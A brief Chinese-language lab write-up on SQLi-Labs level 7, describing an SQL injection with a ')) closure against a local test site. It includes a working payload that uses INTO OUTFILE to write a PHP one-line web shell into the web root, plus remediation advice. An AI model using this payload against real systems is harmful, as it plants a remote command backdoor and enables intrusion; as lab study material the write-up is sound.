# SQLi-Labs | Less-7 GET 单引号括号 导出文件注入
## 一、漏洞简介
闭合符号 '))，目标是into outfile写webshell，需要mysql有文件写入权限、secure_file_priv为空。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-7/?id=1
## 三、复现步骤
1. ?id=1')) 测试闭合，页面正常
2. 使用into outfile写入一句话木马
## 四、Payload
?id=-1')) union select 1,"<?php @eval($_POST['cmd']);?>",3 into outfile "D:/phpstudy/WWW/shell.php" --+
## 五、漏洞原理
SQL拼接，mysql支持导出文件，目标路径可控。
## 六、修复方案
限制mysql文件写入权限，secure_file_priv配置，禁止用户可控参数拼接到outfile。
## 七、总结
写shell关卡，重点：mysql权限、路径正确、闭合'))。